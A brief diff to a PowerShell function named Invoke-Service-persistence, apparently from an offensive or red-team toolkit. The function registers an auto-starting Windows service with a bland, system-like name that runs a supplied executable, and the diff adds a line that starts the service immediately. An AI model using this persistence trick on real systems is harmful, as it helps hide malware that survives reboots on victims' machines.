@@ -6,4 +6,5 @@ function Invoke-Service-persistence
     )
 
 	New-Service -Name "ModuleDevices" -BinaryPathName $exePath -DisplayName "Module Devices" -StartupType "Automatic" -Description "Module Devices"
+	Start-Service -Name "ModuleDevices"
 }
